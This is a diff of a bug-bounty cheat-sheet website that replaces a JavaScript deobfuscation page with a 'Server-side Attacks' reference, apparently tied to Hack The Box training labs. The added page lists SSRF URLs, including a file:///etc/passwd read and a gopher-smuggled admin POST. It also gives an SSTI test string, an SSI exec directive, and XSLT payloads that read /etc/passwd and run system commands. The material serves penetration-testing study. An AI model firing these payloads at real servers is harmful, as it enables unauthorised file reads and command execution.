@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../attacking-web-applications-with-ffuf/">
+        <link rel="prev" href="../file-upload-attacks/">
       
       
-        <link rel="next" href="../cross-site-scripting-%28xss%29/">
+        <link rel="next" href="../login-brute-forcing/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>JavaScript Deobfuscation - Bug Bounty Hub</title>
+        <title>Server-side Attacks - Bug Bounty Hub</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#javascript-deobfuscation" class="md-skip">
+        <a href="#server-side-attacks" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              JavaScript Deobfuscation
+              Server-side Attacks
             
           </span>
         </div>
@@ -431,32 +431,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    JavaScript Deobfuscation
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -467,62 +445,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
-    <span class="md-ellipsis">
-      Terms
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commands
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -647,10 +569,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../server-side-attacks/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Server-side Attacks
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -661,6 +605,167 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSRF
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      Protocols
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSTI
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      Test String
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssi-injection-directives" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSI Injection - Directives
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xslt-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSLT Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSLT Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#elements" class="md-nav__link">
+    <span class="md-ellipsis">
+      Elements
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#injection-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Injection Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Injection Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#information-disclosure" class="md-nav__link">
+    <span class="md-ellipsis">
+      Information Disclosure
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lfi" class="md-nav__link">
+    <span class="md-ellipsis">
+      LFI
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      RCE
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -984,38 +1089,143 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
+  <a href="#ssrf" class="md-nav__link">
     <span class="md-ellipsis">
-      Terms
+      SSRF
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#protocols" class="md-nav__link">
+    <span class="md-ellipsis">
+      Protocols
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssti" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSTI
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSTI">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#test-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      Test String
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssi-injection-directives" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSI Injection - Directives
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
+  <a href="#xslt-injection" class="md-nav__link">
     <span class="md-ellipsis">
-      Commands
+      XSLT Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSLT Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#elements" class="md-nav__link">
+    <span class="md-ellipsis">
+      Elements
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#injection-payloads" class="md-nav__link">
     <span class="md-ellipsis">
-      Useful Websites
+      Injection Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Injection Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#information-disclosure" class="md-nav__link">
+    <span class="md-ellipsis">
+      Information Disclosure
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#lfi" class="md-nav__link">
     <span class="md-ellipsis">
-      Misc
+      LFI
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rce" class="md-nav__link">
+    <span class="md-ellipsis">
+      RCE
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1035,176 +1245,152 @@
 
 
 
-<h1 id="javascript-deobfuscation">JavaScript Deobfuscation</h1>
-<h2 id="terms">Terms</h2>
+<h1 id="server-side-attacks">Server-Side Attacks</h1>
+<h2 id="ssrf">SSRF</h2>
+<h3 id="exploitation">Exploitation</h3>
+<ul>
+<li>internal portscan by accessing ports on localhost</li>
+<li>accessing restricted endpoints</li>
+</ul>
+<h3 id="protocols">Protocols</h3>
+<ul>
+<li><code>http://127.0.0.1/</code></li>
+<li><code>file:///etc/passwd</code></li>
+<li><code>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin</code></li>
+</ul>
+<h2 id="ssti">SSTI</h2>
+<h3 id="exploitation_1">Exploitation</h3>
+<p>Templating Engines are used to dynamically generate content</p>
+<h3 id="test-string">Test String</h3>
+<ul>
+<li><code>${{&lt;%[%'"}}%\.</code></li>
+</ul>
+<h2 id="ssi-injection-directives">SSI Injection - Directives</h2>
 <table>
 <thead>
 <tr>
-<th>Term</th>
+<th>Directive</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Code minification</td>
-<td>Reduces code to a single line often saved as .min.js.</td>
+<td><code>&lt;!--#printenv --&gt;</code></td>
+<td>Print variables</td>
 </tr>
 <tr>
-<td>Packing</td>
-<td>Obfuscation recognizable from the six function arguments used in the initial function "function(p,a,c,k,e,d)".</td>
+<td><code>&lt;!--#config errmsg="Error!" --&gt;</code></td>
+<td>Change config</td>
 </tr>
 <tr>
-<td>JSFuck</td>
-<td>Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar).</td>
+<td><code>&lt;!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" --&gt;</code></td>
+<td>Print specific variable</td>
 </tr>
 <tr>
-<td>Base 64</td>
-<td>Contains only alpha-numeric, + and /. Padded with '='.</td>
+<td><code>&lt;!--#exec cmd="whoami" --&gt;</code></td>
+<td>Execute command</td>
 </tr>
 <tr>
-<td>Hex</td>
-<td>Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f.</td>
-</tr>
-<tr>
-<td>Ceasar</td>
-<td>Shifts each char by a fixed number</td>
-</tr>
-<tr>
-<td>Rot13</td>
-<td>Most common ceaser cipher, shifts by 13</td>
+<td><code>&lt;!--#include virtual="index.html" --&gt;</code></td>
+<td>Include web file</td>
 </tr>
 </tbody>
 </table>
-<h2 id="commands">Commands</h2>
+<h2 id="xslt-injection">XSLT Injection</h2>
+<h3 id="elements">Elements</h3>
 <table>
 <thead>
 <tr>
-<th>Command</th>
+<th>Element</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>curl http://SERVER_IP:PORT/</code></td>
-<td>cURL GET request</td>
+<td><code>&lt;xsl:template&gt;</code></td>
+<td>Indicates an XSL template. Can contain a match attribute that contains a path in the XML-document that the template applies to</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST</code></td>
-<td>cURL POST request</td>
+<td><code>&lt;xsl:value-of&gt;</code></td>
+<td>Extracts the value of the XML node specified in the select attribute</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"</code></td>
-<td>cURL POST with data</td>
+<td><code>&lt;xsl:for-each&gt;</code></td>
+<td>Enables looping over all XML nodes specified in the select attribute</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | base64</code></td>
-<td>base64 encode</td>
+<td><code>&lt;xsl:sort&gt;</code></td>
+<td>Specifies the node to sort elements in a for loop by in the select argument. A sort order may be specified in the order argument</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_B64 | base64 -d</code></td>
-<td>base64 decode</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | xxd -p</code></td>
-<td>hex encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_HEX | xxd -p -r</code></td>
-<td>hex decode</td>
-</tr>
-<tr>
-<td><code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 encode</td>
-</tr>
-<tr>
-<td><code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 decode</td>
+<td><code>&lt;xsl:if&gt;</code></td>
+<td>Used to test for conditions on a node. The condition is specified in the test argument</td>
 </tr>
 </tbody>
 </table>
-<h2 id="useful-websites">Useful Websites</h2>
+<h3 id="injection-payloads">Injection Payloads</h3>
+<h4 id="information-disclosure">Information Disclosure</h4>
 <table>
 <thead>
 <tr>
-<th>Site</th>
+<th>Payload</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="https://jsconsole.com/">JS Console</a></td>
-<td>Interactive JavaScript console for testing code.</td>
+<td><code>&lt;xsl:value-of select="system-property('xsl:version')" /&gt;</code></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://www.toptal.com/developers/javascript-minifier">JS Minifier</a></td>
-<td>Minifies JavaScript for performance optimization.</td>
+<td><code>&lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;</code></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://beautifytools.com/javascript-obfuscator.php">BeatifyTools</a></td>
-<td>Obfuscates JavaScript to protect code.</td>
+<td><code>&lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;</code></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://obfuscator.io/">JS Obfuscator Tool</a></td>
-<td>Tool to obfuscate JavaScript code securely.</td>
+<td><code>&lt;xsl:value-of select="system-property('xsl:product-name')" /&gt;</code></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://jsfuck.com/">JSFuck</a></td>
-<td>Encodes JavaScript using only six characters.</td>
-</tr>
-<tr>
-<td><a href="https://utf-8.jp/public/jjencode.html">jjencode</a></td>
-<td>Encodes JavaScript with JJEncode technique.</td>
-</tr>
-<tr>
-<td><a href="https://utf-8.jp/public/aaencode.html">aaencode</a></td>
-<td>Encodes JavaScript with AAEncode method.</td>
-</tr>
-<tr>
-<td><a href="https://prettier.io/playground/">Prettier</a></td>
-<td>Formats and beautifies JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://beautifier.io/">js-beautify</a></td>
-<td>Beautifies minified or obfuscated JavaScript.</td>
-</tr>
-<tr>
-<td><a href="https://matthewfl.com/unPacker.html">UnPacker</a></td>
-<td>Deobfuscates and unpacks JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://rot13.com/">rot13.com</a></td>
-<td>Applies ROT13 encoding/decoding for text.</td>
-</tr>
-<tr>
-<td><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a></td>
-<td>Identifies cipher types in encoded text.</td>
+<td><code>&lt;xsl:value-of select="system-property('xsl:product-version')" /&gt;</code></td>
+<td></td>
 </tr>
 </tbody>
 </table>
-<h2 id="misc">Misc</h2>
+<h4 id="lfi">LFI</h4>
 <table>
 <thead>
 <tr>
-<th>Command/Action</th>
+<th>Payload</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>ctrl+u</code></td>
-<td>Show HTML source code in Firefox</td>
+<td><code>&lt;xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" /&gt;</code></td>
+<td></td>
 </tr>
 <tr>
-<td><code>ctrl+shift+z</code></td>
-<td>Open browser debugger tab</td>
+<td><code>&lt;xsl:value-of select="php:function('file_get_contents','/etc/passwd')" /&gt;</code></td>
+<td></td>
 </tr>
+</tbody>
+</table>
+<h4 id="rce">RCE</h4>
+<table>
+<thead>
 <tr>
-<td>'{ }' button</td>
-<td>Pretty print in debugger tab</td>
+<th>Payload</th>
+<th>Description</th>
 </tr>
+</thead>
+<tbody>
 <tr>
-<td>Unpack</td>
-<td>Replace eval function with console.log</td>
+<td><code>&lt;xsl:value-of select="php:function('system','id')" /&gt;</code></td>
+<td></td>
 </tr>
 </tbody>
 </table>
